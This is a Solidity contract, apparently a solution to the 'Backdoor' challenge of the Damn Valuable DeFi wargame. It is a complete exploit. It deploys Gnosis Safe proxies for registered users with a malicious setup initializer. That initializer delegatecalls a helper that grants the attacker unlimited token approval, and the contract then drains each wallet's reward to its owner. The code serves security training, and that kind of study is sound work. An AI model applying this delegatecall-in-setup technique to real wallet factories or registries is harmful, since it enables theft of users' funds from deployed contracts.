// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./WalletRegistry.sol";
import "../DamnValuableToken.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

contract BackdoorExploiter {
    address private immutable owner;

    constructor(address[] memory _users, address _registry) {
        owner = msg.sender;
        WalletRegistry registry = WalletRegistry(_registry);
        GnosisSafeProxyFactory factory = GnosisSafeProxyFactory(registry.walletFactory());
        GnosisSafe masterCopy = GnosisSafe(payable(registry.masterCopy()));
        IERC20 token = registry.token();
        DelegateCallback callback = new DelegateCallback();

        for(uint i = 0; i < _users.length;) {
            address user = _users[i];
            address[1] memory userArray = [user];
            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector, 
                userArray,
                1,
                address(callback),
                abi.encodeWithSelector(
                    DelegateCallback.approve.selector,
                    address(token),
                    address(this)
                ),
                address(0),
                address(0),
                0,
                address(0)
            );

            GnosisSafeProxy proxy = factory.createProxyWithCallback(
                address(masterCopy),
                initializer,
                i,
                registry
            );
            token.transferFrom(address(proxy), owner, 10 ether);
            unchecked{++i;}
        }
    }

    
}

contract DelegateCallback {
    function approve(address _token, address _owner) public {
        DamnValuableToken token = DamnValuableToken(_token);
        token.approve(_owner, type(uint256).max);
    }
}
